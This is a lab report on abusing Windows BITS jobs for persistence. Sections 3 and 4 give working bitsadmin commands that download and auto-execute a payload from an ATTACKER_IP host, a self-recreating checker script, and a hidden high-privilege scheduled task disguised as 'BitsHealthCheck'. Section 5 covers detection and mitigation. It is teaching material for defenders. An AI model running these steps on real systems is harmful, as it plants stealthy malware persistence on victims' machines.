# Persistence Using BITSAdmin — Report

## 1. Introduction

**Background Intelligent Transfer Service (BITS)** is a Windows component designed to transfer files asynchronously between a client and server, throttling bandwidth so it doesn't interfere with the user's foreground network usage. It's what Windows Update, antivirus signature updates, and many legitimate applications use to download files quietly in the background.

Because BITS is a trusted, signed Microsoft service that runs with elevated privileges and is rarely scrutinized, attackers abuse it to:
- Download a malicious payload without triggering typical "suspicious network tool" alerts (the traffic looks like normal BITS activity).
- Execute that payload automatically via a `SetNotifyCmdLine` command, which BITS runs when a transfer completes.
- Persist across reboots, since BITS jobs are stored in a job database (`qmgr.db`) that survives restarts, not tied to a single running process.

This combination — stealthy delivery plus built-in execution plus reboot survival — makes BITS a convenient persistence mechanism that blends into normal system noise.

## 2. Understanding BITS and Its Capabilities

BITS operates through the `BITS` Windows service, managed via the `bitsadmin.exe` CLI tool (deprecated but still present) or the modern `BitsTransfer` PowerShell module. Key properties attackers exploit:

- **Asynchronous execution**: jobs run independently of the process that created them.
- **Notification commands**: `SetNotifyCmdLine` lets a job run an arbitrary command when the transfer finishes or errors — this is the execution primitive.
- **Persistence by design**: BITS jobs survive reboots and user logoff by default; Windows resumes them automatically.
- **Low visibility**: BITS activity isn't usually monitored as closely as direct network tools like `curl` or `certutil`, making it attractive for blending in.

This is why BITS is a known, catalogued technique — MITRE ATT&CK lists it as **T1197 (BITS Jobs)**.

## 3. Creating a Malicious BITS Job

Enumerate existing jobs first:

```powershell
bitsadmin /list /allusers /verbose
```

Create a job that downloads a payload and executes it on completion:

```cmd
bitsadmin /create payload_job
bitsadmin /addfile payload_job http://ATTACKER_IP:8000/payload.exe C:\Users\Public\payload.exe
bitsadmin /SetNotifyCmdLine payload_job "C:\Users\Public\payload.exe" NULL
bitsadmin /SetNotifyFlags payload_job 3
bitsadmin /resume payload_job
```

What each step does:
- `/create` — registers a new, named BITS job.
- `/addfile` — queues the download (source URL → local destination).
- `/SetNotifyCmdLine` — the payload's execution hook: this command runs automatically once the transfer completes.
- `/SetNotifyFlags 3` — notify on both job completion (`1`) and job error (`2`), combined as `3`, so the command fires either way.
- `/resume` — starts the job (BITS jobs are created suspended).

## 4. Implementing a Persistence Mechanism

A single BITS job can be deleted if discovered, so the real persistence comes from a **checker script** that recreates it if removed — turning a one-shot job into a self-healing mechanism.

```powershell
# checker.ps1
$jobName = "payload_job"
$existing = bitsadmin /list /allusers | Select-String $jobName

if (-not $existing) {
    bitsadmin /create $jobName
    bitsadmin /addfile $jobName "http://ATTACKER_IP:8000/payload.exe" "C:\Users\Public\payload.exe"
    bitsadmin /SetNotifyCmdLine $jobName "C:\Users\Public\payload.exe" NULL
    bitsadmin /SetNotifyFlags $jobName 3
    bitsadmin /resume $jobName
}
```

Automate the checker itself with a Scheduled Task so it runs independently of the BITS job:

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Users\Public\checker.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "BitsHealthCheck" -Action $action -Trigger $trigger -RunLevel Highest
```

This creates a layered persistence chain: Scheduled Task → checker script → BITS job → payload execution. Removing any single layer doesn't break the whole chain unless all three are found and cleaned.

## 5. Detecting and Preventing Malicious BITS Jobs

**Detection:**
- Enumerate active jobs regularly: `bitsadmin /list /allusers /verbose` — look for unfamiliar job names, unexpected URLs, or `NotifyCmdLine` values pointing to non-standard executables.
- **Windows Event Log** — BITS-Client operational log (`Microsoft-Windows-Bits-Client/Operational`) records job creation, transfer completion, and the exact command line BITS executes. Event ID 3 (job created), 4 (download complete), 59/60 (notify command executed) are the key events to review.
- Sysmon (if deployed) can flag `bitsadmin.exe` or the `BITS` service spawning child processes — a strong indicator of the `SetNotifyCmdLine` execution path being abused.

**Prevention / mitigation:**
- Restrict outbound BITS traffic via firewall rules scoped to known update servers only.
- Use a GPO to disable BITS for standard users where not needed, or constrain job creation to admin contexts.
- Monitor for `SetNotifyCmdLine` usage specifically — legitimate software rarely sets this to an executable in a user-writable path like `C:\Users\Public`.
- Periodically audit `bitsadmin /list /allusers` as part of persistence-hunting routines, alongside Run keys, services, and scheduled tasks.

## 6. Conclusion

BITS persistence works because it hides in plain sight: a signed, trusted Windows service with a built-in command-execution feature (`SetNotifyCmdLine`) and reboot survival. The attack chain — create job → download payload → execute on completion → checker script to self-heal → scheduled task to run the checker — demonstrates how layering several "boring" legitimate features creates a persistence mechanism that's easy to build and inconvenient to fully remove.

Defensively, the fix isn't avoiding BITS (it's necessary for normal OS operation) but **actively auditing it** — treating `bitsadmin /list` and the BITS-Client event log as a routine part of persistence hunting, exactly as you would Run keys, services, and scheduled tasks covered in the earlier tasks of this lab.
